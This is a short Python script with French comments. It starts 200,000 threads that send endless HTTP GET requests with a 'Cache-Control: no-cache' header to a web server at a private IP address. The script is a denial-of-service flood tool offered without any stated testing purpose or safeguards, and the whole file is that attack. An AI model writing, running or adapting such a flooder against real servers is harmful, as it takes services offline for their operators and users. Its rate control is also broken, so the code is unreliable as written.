import requests
import threading
import time

# URL du serveur web
url = "http://192.168.1.253"

# Nombre de requêtes par seconde
frequency = 200000

# Fonction pour envoyer une requête HTTP
def send_request():
    while True:
        # Envoi de la requête avec le header 'Cache-Control' à 'no-cache'
        response = requests.get(url, headers={'Cache-Control': 'no-cache'})

        # Attente pour respecter la fréquence demandée
        time.sleep(1/frequency)

# Création de plusieurs threads pour envoyer les requêtes simultanément
threads = []
for i in range(frequency):
    thread = threading.Thread(target=send_request)
    thread.daemon = True
    threads.append(thread)

# Lancement des threads
for thread in threads:
    thread.start()

# Attente de la fin des threads
for thread in threads:
    thread.join()
